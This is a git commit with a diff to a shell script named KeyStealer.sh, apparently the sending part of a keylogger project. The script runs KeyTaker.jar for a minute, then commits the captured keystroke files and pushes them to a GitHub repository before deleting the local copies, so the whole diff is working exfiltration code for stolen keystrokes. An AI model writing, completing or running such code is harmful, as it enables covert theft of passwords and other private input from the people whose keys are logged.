a68f834382624ba9999c7ad6408b1fc5ad3d10ac
Menge456 <menge456123@gmail.com>
2021-08-09 12:08:54 -0400

    Fixing the sending

--- KeyStealer.sh
+++ KeyStealer.sh
@@ -1,7 +1,7 @@
 java -jar KeyTaker.jar & sleep 60 ; kill $!
 git remote set-url origin https://github.com/Menge456/KeyListenerStuff
-cd keys
-git add Keys***.txt
+mv Keys***.txt keys/
+git add keys/Keys***.txt
 git commit -m "KeyStealer"
 git push origin
-rm -f Keys***.txt
+rm Keys***.txt
